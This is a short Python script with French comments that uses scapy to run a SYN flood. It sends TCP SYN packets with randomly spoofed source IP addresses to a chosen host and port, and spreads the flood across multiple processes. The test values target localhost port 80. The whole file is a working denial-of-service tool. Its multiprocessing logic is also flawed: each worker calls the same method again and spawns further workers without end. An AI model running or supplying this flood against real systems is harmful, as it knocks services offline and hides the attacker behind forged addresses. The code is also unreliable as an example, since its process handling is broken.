from scapy.all import *
import multiprocessing

class ENVOIS:
    @staticmethod
    def syn(cible, port, nbrpaquet, nbr_processus):
        # Boucle pour envoyer des paquets SYN
        for _ in range(nbrpaquet):
            # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
            ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
            tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
            # Envoie paquet
            send(ip/tcpsyn, verbose=False)

        # Création des processus pour envoyer les paquets SYN en parallèle
        processus = []
        for _ in range(nbr_processus):
            p = multiprocessing.Process(target=ENVOIS.syn, args=(cible, port, nbrpaquet // nbr_processus, 1))
            processus.append(p)

        # Démarrage des processus
        for p in processus:
            p.start()

        # Attendre que tous les processus se terminent
        for p in processus:
            p.join()

if __name__ == "__main__":
    # Paramètres de test
    cible = "127.0.0.1"
    port = 80
    nbrpaquet = 1000
    nbr_processus = 4

    # Appel de la méthode syn de la classe ENVOIS avec le nombre de processus spécifié
    ENVOIS.syn(cible, port, nbrpaquet, nbr_processus)
